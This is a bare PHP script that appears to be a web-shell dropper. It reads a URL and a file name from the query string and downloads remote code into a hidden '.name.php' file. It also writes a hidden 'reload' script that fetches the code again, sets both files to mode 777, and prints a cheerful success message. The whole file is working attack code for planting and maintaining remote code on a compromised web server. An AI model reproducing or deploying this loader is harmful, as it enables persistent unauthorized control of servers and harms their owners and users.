<?php
error_reporting(1);
$link = $_GET['link'];
$name = $_GET['name'];
file_put_contents(".$name.php",file_get_contents("$link"));
file_put_contents(".".$name."_reload.php",'<?php
error_reporting(1);
file_put_contents(".'.$name.'.php",file_get_contents("'.$link.'"));
chmod(".'.$name.'.php",777);
echo "( .'.$name.'.php ) reloaded successfully";');
chmod(".$name.php",777);
echo "( .$name.php ) Created successfully ;)";
